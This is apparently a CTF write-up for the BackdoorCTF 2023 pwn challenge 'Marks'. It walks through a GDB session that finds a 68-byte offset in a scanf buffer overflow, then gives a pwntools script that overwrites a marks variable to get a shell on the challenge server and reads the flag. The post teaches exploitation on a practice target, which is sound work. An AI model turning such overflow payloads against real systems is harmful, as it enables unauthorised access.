---
title: Marks
date: 2023-12-16 20:41:00 + 0530
categories: [writeup, pwn]
tags: [BackdoorCTF2023]     # TAG names should always be lowercase
---

## The Challenge

> Score 100/100 to pass this exam
>
>Attachments: marks.zip
>
>nc 34.70.212.151 8004

## The Solution

Here's what happens when we run the binary
```console
$ ./chal
Enter your details to view your marks ...
Roll Number : 1
Name : VulnX
Please Wait ...

You got 20 marks out of 100
Any Comments ?
gimme_the_flag!! 
Thanks !
Next time get 100/100 marks for shell :)
$ 
```

On reverse engineering the main() function we find out that the program does the following:
1. Gives us a prompt and stores our roll number and name into local variables on the stack
2. Sleeps for 1s
3. Assigns a random number to `marks` variable and prints it out to the console.
4. It prompts us for `comments` (if any) and stores our input into a 64 byte buffer on the stack.
5. Then it compares the `marks` and if it is 100, then we get a shell, otherwise it rejects and exits.

Since it uses `scanf` for input, its pretty clear that we have a buffer overflow vulnerability.

Since `marks` is calculated before the `comments` is stored, we can use buffer overflow vulnerability to overwrite `marks` and insert 100 ( or 0x64 ) in that place.

All we need to do is precisely find out how many bytes will we need to overwrite stuff into the `marks` variable. To do that let's open the program in GDB and set a breakpoint at `main+310` and give our binary a cyclic pattern
```
$ gdb ./chal -q
Reading symbols from ./chal...
(No debugging symbols found in ./chal)
gdb-peda$ break * main+310
Breakpoint 1 at 0x1404

gdb-peda$ run
Starting program: /home/vulnx/Games/CTFs/BackdoorCTF/Beginner/Marks/chal
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Enter your details to view your marks ...
Roll Number : 1
Name : VulnX
Please Wait ...

You got 22 marks out of 100
Any Comments ?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Thanks !
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.
[----------------------------------registers-----------------------------------]
RAX: 0x61616172 ('raaa')
RBX: 0x7fffffffe6e8 --> 0x7fffffffe9d3 ("/home/vulnx/Games/CTFs/BackdoorCTF/Beginner/Marks/chal")
RCX: 0x7ffff7d00aa4 (<write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0
RSI: 0x7ffff7e3b643 --> 0xe3c710000000000a
RDI: 0x7ffff7e3c710 --> 0x0
RBP: 0x7fffffffe5d0 ("uaaavaaawaaaxaaayaaa")
RSP: 0x7fffffffe560 --> 0x586e6c7556 ('VulnX')
RIP: 0x555555555404 (<main+310>:	cmp    eax,0x64)
R8 : 0x1
R9 : 0xa ('\n')
R10: 0xffffffffffffffff
R11: 0x202
R12: 0x0
R13: 0x7fffffffe6f8 --> 0x7fffffffea0a ("ALACRITTY_LOG=/tmp/Alacritty-2578215.log")
R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x555555554000 --> 0x10102464c457f
R15: 0x555555557d78 --> 0x555555555220 (<__do_global_dtors_aux>:	endbr64)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555553f9 <main+299>:	mov    rdi,rax
   0x5555555553fc <main+302>:	call   0x5555555550e0 <puts@plt>
   0x555555555401 <main+307>:	mov    eax,DWORD PTR [rbp-0xc]
=> 0x555555555404 <main+310>:	cmp    eax,0x64
   0x555555555407 <main+313>:	je     0x55555555541a <main+332>
   0x555555555409 <main+315>:	lea    rax,[rip+0xc88]        # 0x555555556098
   0x555555555410 <main+322>:	mov    rdi,rax
   0x555555555413 <main+325>:	call   0x5555555550e0 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe560 --> 0x586e6c7556 ('VulnX')
0008| 0x7fffffffe568 --> 0x60000000a
0016| 0x7fffffffe570 --> 0x900000
0024| 0x7fffffffe578 --> 0x0
0032| 0x7fffffffe580 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0040| 0x7fffffffe588 ("caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0048| 0x7fffffffe590 ("eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0056| 0x7fffffffe598 ("gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555555404 in main ()
gdb-peda$
```

> I generated that `aaaa...` pattern by using `$ cyclic 100`
{: .prompt-tip }

You can clearly see that the current instruction `=> 0x555555555404 <main+310>:	cmp    eax,0x64` is comparing the value in register eax with 0x64 ( or 100, in decimal ). This was supposed to store the `marks` variable but since our `comments` were 100 bytes instead of the allocated 64 bytes, the rest of the data got overwritten into nearby locations on the stack, one of them happens to be `marks`. The eax register holds the value for `marks` and is currently loaded with the value `RAX: 0x61616172 ('raaa')` proving that 0x61616172 is overwritten. Let's use this value to calculate the offset.
```console
$ cyclic -l 0x61616172
68
```

So anything after the first 64 bytes will be written over `marks`. Let's create an exploit script with this information.
```py
from pwn import *

p = remote('34.70.212.151', 8004)

p.sendlineafter(b'Roll Number : ', b'1')
p.sendlineafter(b'Name : ', b'VulnX')

offset = 68
payload  = b''
payload += b'A' * offset
payload += b'\x64'
p.sendlineafter(b'Any Comments ?\n', payload)
p.clean()

p.interactive()
```
{: file="get_flag.py" }

and let's give it a go
```console
> python get_flag.py
[+] Opening connection to 34.70.212.151 on port 8004: Done
[*] Switching to interactive mode
Thanks !
Cool ! Here is your shell !
$ ls
chal
flag.txt
$ cat flag.txt
flag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}
```


## FLAG

`flag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}`

